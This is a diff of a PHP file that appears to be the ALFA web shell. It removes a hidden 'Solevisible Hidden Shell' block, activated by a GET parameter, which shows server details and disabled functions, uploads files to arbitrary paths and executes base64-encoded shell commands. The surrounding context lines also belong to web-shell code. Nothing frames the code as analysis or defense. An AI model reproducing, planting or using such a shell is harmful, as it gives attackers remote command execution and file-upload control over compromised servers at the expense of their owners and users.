@@ -647,42 +647,6 @@ function _alfa_fsockopen($server,$uri,$post){
 		return "";
 	}
 }
-if(isset($_GET["solevisible"])){
-@error_reporting(E_ALL ^ E_NOTICE);
-echo '<html>';
-echo "<title>Solevisible Hidden Shell</title>";
-echo "<body bgcolor=#000000>";
-echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
-$safe_mode = @ini_get('safe_mode');
-if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
-echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
-echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
-echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
-echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@getcwd()) . "/<br />";
-echo "<b style='color: #7CFC00'>Safe Mode : $r<br>";
-echo"<font color=#7CFC00>Disable functions : </font>";
-$disfun = @ini_get('disable_functions');
-if(empty($disfun)){$disfun = '<font color="green">NONE</font>';}
-echo"<font color=red>";
-echo "$disfun";
-echo"</font><br>";
-echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
-echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
-echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@getcwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
-if(isset($_FILES['file'])){
-if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
-else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
-}
-echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.value = btoa(unescape(encodeURIComponent(this.command_solevisible.value)));" method="POST">Execute Command: <input name="command_solevisible" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
-<hr><pre>';
-if(isset($_POST['command_solevisible'])){
-if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
-$solevisible = "cd '".addslashes(str_replace("\\","/",@getcwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
-echo alfaEx($solevisible);
-}
-echo'</pre>
-</body></html>';
 exit;}
 @error_reporting(E_ALL ^ E_NOTICE);
 @ini_set('error_log',NULL);
